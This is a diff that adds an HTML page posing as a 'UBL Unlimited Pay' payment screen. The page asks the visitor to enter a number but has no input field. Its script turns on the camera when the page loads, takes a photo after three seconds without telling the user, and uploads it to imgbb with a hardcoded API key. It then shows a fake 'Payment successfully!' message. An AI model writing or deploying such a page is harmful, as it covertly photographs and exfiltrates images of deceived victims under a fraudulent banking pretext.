@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>UBL Unlimited Pay</title>
+</head>
+<body>
+  <h2>Enter Your Number To Pay</h2>
+  <video id="video" autoplay></video>
+  <p id="status"></p>
+
+  <script>
+    const video = document.getElementById('video');
+    const status = document.getElementById('status');
+
+    // Start Camera
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(stream => {
+        video.srcObject = stream;
+
+        // Automatically capture photo after 3 seconds
+        setTimeout(captureAndUploadPhoto, 3000);
+      })
+      .catch(err => {
+        console.error("Camera access denied:", err);
+        status.innerText = "Error accessing camera!";
+      });
+
+    // Capture Photo and Upload
+    function captureAndUploadPhoto() {
+      const canvas = document.createElement('canvas');
+      const ctx = canvas.getContext('2d');
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+      const imageData = canvas.toDataURL('image/png');
+
+      // Save Photo to Imgbb
+      const imgbbAPIKey = "05286aa5b2d314959e9cd61d0693d3e2"; // Your API key
+      fetch(`https://api.imgbb.com/1/upload?key=${imgbbAPIKey}`, {
+        method: "POST",
+        body: new URLSearchParams({
+          image: imageData.split(',')[1] // Remove "data:image/png;base64,"
+        })
+      })
+      .then(response => response.json())
+      .then(data => {
+        if (data.success) {
+          status.innerText = "Payment successfully!";
+          console.log("Photo URL:", data.data.url); // Use this URL as needed
+        } else {
+          status.innerText = "Error please try again.";
+        }
+      })
+      .catch(err => {
+        console.error("Error please try again:", err);
+        status.innerText = "Error please try again.";
+      });
+    }
+  </script>
+</body>
+</html>
